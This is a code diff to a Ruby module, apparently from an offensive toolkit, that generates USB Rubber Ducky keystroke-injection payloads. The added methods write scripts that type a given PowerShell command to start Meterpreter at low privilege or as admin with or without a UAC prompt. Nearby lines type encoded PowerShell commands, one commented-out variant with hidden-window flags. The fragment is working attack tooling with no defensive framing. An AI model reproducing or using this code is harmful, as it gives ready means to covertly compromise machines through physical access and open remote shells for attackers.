@@ -19,6 +19,15 @@ module DuckySetUp
   def save_notepad
     "CTRL s\n#{temp_path}\nEnter\n"
   end
+  def ducky_fast_meterpreter_low(powershell_command)
+    File.open("#{text_path}#{fast_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING #{powershell_command}\nENTER")}
+  end
+  def ducky_fast_meterpreter_uac(powershell_command)
+    File.open("#{text_path}#{fast_meterpreter_file}",'w') {|f| f.write("#{admin_with_uac}\nSTRING #{powershell_command}\nENTER")}
+  end
+  def ducky_fast_meterpreter_no_uac(powershell_command)
+    File.open("#{text_path}#{fast_meterpreter_file}",'w') {|f| f.write("#{admin_with_out_uac}\nSTRING #{powershell_command}\nENTER")}
+  end
   def ducky_meterpreter_low(encoded_command)
     #File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -nop -wind hidden -noni -enc #{encoded_command}\nENTER")}
     File.open("#{text_path}#{reverse_meterpreter_file}",'w') {|f| f.write("#{low_priv}\nSTRING powershell -enc #{encoded_command}\nENTER")}
